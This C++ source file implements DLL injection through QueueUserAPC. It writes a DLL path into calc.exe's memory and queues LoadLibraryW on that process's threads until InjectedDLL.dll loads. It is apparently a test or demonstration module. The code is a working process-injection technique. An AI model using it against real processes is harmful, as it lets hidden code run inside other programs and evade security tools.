#include "pch.h"

#include "QueueUserAPC.h"

//
//  Check whatever InjectedDLL.dll was loaded, because this dll
//  does not provide any other way of caller notification.
//
BOOL IsDllInjected(DWORD dwProcessId, LPTSTR DllName)
{
	BOOL bFound = FALSE;
	HANDLE hSnapshot;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
	if (hSnapshot != INVALID_HANDLE_VALUE) {

		MODULEENTRY32 me32;
		me32.dwSize = sizeof(MODULEENTRY32);

		if (Module32First(hSnapshot, &me32)) {

			do {

				if (StrCmpI(me32.szModule, DllName) == 0) {
					bFound = TRUE;
					break;
				}

			} while (Module32Next(hSnapshot, &me32));

		}

		CloseHandle(hSnapshot);
	}

	return bFound;
}

BOOL QueueUserAPC_Injection()
{
	TCHAR lpDllName[] = _T("InjectedDLL.dll");
	TCHAR lpDllPath[MAX_PATH];

	HANDLE hThreadSnapshot = INVALID_HANDLE_VALUE;

	DWORD dwTargetProcessId, dwCurrentProcessId = GetCurrentProcessId();

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	HMODULE hKernel32;

	FARPROC LoadLibraryAddress;
	LPVOID lpBaseAddress = NULL;
	BOOL bStatus = FALSE;


	/* Get Process ID from Process name */

	//
	// calc used because it has multiple threads and some of them maybe alertable.
	//
	dwTargetProcessId = GetProcessIdFromName(_T("calc.exe"));
	if (dwTargetProcessId == 0)
		dwTargetProcessId = GetProcessIdFromName(_T("win32calc.exe"));//w10 classic calc

	if (dwTargetProcessId == 0) {
		print_last_error(_T("GetProcessIdFromName"));
		return FALSE;
	}

	/* Obtain a hmodule of kernel32 */
	hKernel32 = GetModuleHandle(_T("kernel32.dll"));
	if (hKernel32 == NULL) {
		print_last_error(_T("GetModuleHandle"));
		return FALSE;
	}

	/* Get LoadLibrary address */
	_tprintf(_T("\t[+] Looking for LoadLibrary in kernel32\n"));
	LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
	if (LoadLibraryAddress == NULL) {
		print_last_error(_T("GetProcAddress"));
		return FALSE;
	}
	_tprintf(_T("\t[+] Found at 0x%p\n"), LoadLibraryAddress);

	_tprintf(_T("\t[+] Getting proc id: %u\n"), dwTargetProcessId);

	/* Obtain a handle the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetProcessId);
	if (hProcess == NULL) {
		print_last_error(_T("OpenProcess"));
		return FALSE;
	}

	do { // not a loop

		/* Get the full path of the dll */
		GetFullPathName(lpDllName, MAX_PATH, lpDllPath, NULL);
		_tprintf(_T("\t[+] Full DLL Path: %s\n"), lpDllPath);

		// The maximum size of the string buffer.
		SIZE_T WriteBufferSize = _tcslen(lpDllPath) * sizeof(TCHAR);

		/* Allocate memory into the remote process */
		_tprintf(_T("\t[+] Allocating space for the path of the DLL\n"));
		lpBaseAddress = VirtualAllocEx(hProcess, NULL, WriteBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBaseAddress == NULL) {
			print_last_error(_T("VirtualAllocEx"));
			break;
		}

		/* Write to the remote process */
		printf("\t[+] Writing into the current process space at 0x%p\n", lpBaseAddress);
		if (!WriteProcessMemory(hProcess, lpBaseAddress, lpDllPath, WriteBufferSize, NULL)) {
			print_last_error(_T("WriteProcessMemory"));
			break;
		}

		hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hThreadSnapshot == INVALID_HANDLE_VALUE)
			break;

		THREADENTRY32 te32;
		te32.dwSize = sizeof(THREADENTRY32);

		//
		// Brute force threads to find suitable alertable thread for APC injection (if any).
		//
		if (Thread32First(hThreadSnapshot, &te32)) {
			do {
				if (te32.th32OwnerProcessID == dwTargetProcessId) {

					hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
					if (hThread) {

						if (QueueUserAPC((PAPCFUNC)LoadLibraryAddress, hThread, (ULONG_PTR)lpBaseAddress)) {

							if (IsDllInjected(dwTargetProcessId, lpDllName)) {
								bStatus = TRUE;
							}
						}
						CloseHandle(hThread);
					}
				}

				// dll injected - leave
				if (bStatus) {
					_tprintf(_T("\t[+] Dll has been injected successfully ...\n"));
					break;
				}

			} while (Thread32Next(hThreadSnapshot, &te32));
		}

	} while (FALSE); // not a loop

	//
	// Cleanup.
	//
	if (hThreadSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hThreadSnapshot);

	if (lpBaseAddress) {
		VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
	}

	CloseHandle(hProcess);

	return bStatus;
}
